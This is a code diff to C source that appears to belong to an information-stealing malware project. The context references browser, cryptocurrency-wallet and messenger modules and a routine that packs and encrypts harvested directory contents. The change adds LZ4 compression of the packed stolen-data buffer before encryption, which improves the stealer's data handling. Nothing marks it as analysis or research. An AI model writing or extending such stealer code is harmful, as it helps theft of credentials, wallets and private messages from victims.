@@ -13,6 +13,7 @@
 #include "firefox.h"
 #include "wallets.h"
 #include "messengers.h"
+#include "lz4.h"
 
 #ifdef ENABLE_SYSTEM_INFO
 extern int mirage_collect_system_info(char *output, size_t outlen);
@@ -198,6 +199,28 @@ static unsigned char *pack_and_encrypt_dir(const char *dir, size_t *out_len) {
         }
     } while (g_main_find.pFN(hf, &ffd) != 0);
     g_main_find.pFC(hf);
+
+#ifdef ENABLE_COMPRESSION
+    /* LZ4-compress the packed TLV buffer before encryption */
+    {
+        int comp_bound = lz4_compress_bound((int)off);
+        unsigned char *comp = (unsigned char *)malloc((size_t)comp_bound + 1);
+        if (comp) {
+            int comp_len = lz4_compress((const char *)buf, (char *)(comp + 1),
+                                         (int)off, comp_bound);
+            if (comp_len > 0 && (size_t)comp_len < off) {
+                comp[0] = 0x01; /* magic: LZ4 compressed */
+                free(buf);
+                buf = comp;
+                off = (size_t)comp_len + 1;
+            } else {
+                free(comp);
+                /* keep original uncompressed buf */
+            }
+        }
+        /* If malloc fails, skip compression and send uncompressed */
+    }
+#endif
 
     /* Encrypt with ChaCha20-Poly1305 via archive_crypt */
     size_t enc_cap = total + 4 + 64; /* header + padding */
